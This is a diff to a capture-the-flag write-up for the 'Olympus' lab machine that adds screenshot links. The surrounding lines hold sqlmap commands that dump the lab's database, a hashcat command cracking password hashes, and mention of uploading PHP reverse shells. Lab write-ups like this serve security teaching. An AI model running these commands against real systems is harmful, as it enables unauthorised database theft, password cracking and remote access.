@@ -49,12 +49,13 @@ the most relevant directory for getting the first flag would be the `/~webmaster
 ```bash
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
 ```
-
+![sqlmap](https://github.com/realatharva15/olympus_writeup/blob/main/images/sqlmap.png)
 we get the databases present on the server. the most useful database to us is the olympus db. lets find out the tables present in this database using another sqlmap payload
 
 ```bash
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --tables --random-agent -v 3 --batch
 ```
+![tables](https://github.com/realatharva15/olympus_writeup/blob/main/images/tables.png)
 we can see that we have found the table which contains the flag1 for the CTF. lets dump all the contents from all the tables which we found on the olympus database.
 
 ```bash
@@ -66,6 +67,8 @@ and just like that, we have found the flag1 for the CTF! we have also found some
 hashcat -m 3200 prometheus.txt /usr/share/wordlists/rockyou.txt 
 ```
 this gives us the password for user prometheus which we can use to get a dashboard. here we find a lot of things like chats, posts, etc. but the most important thing will be the email in the users page. this email is  a possible hint for a possible vhost/subdomain. lets add it in our `/etc/hosts` file
+
+![susvhost](https://github.com/realatharva15/olympus_writeup/blob/main/images/susvhost.png)
 
 ```bash
 echo "<target_ip> chat.olympus.thm" | sudo tee -a /etc/hosts
@@ -100,6 +103,9 @@ here we can see the `/uploads` directory, but we still have no idea about the na
 ```bash
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --dump --random-agent -v 3 --batch --fresh-queries
 ```
+
+![shellupload](https://github.com/realatharva15/olympus_writeup/blob/main/images/shellupload.png)
+
 as we can see, we have uploaded multiple reverseshells in the process of figuring out a way to trigger the reverseshell. lets access the reverseshell file in the browser at `http://chat.olympus.thm/uploads/<reverseshell_name.php>`
 
 ```bash
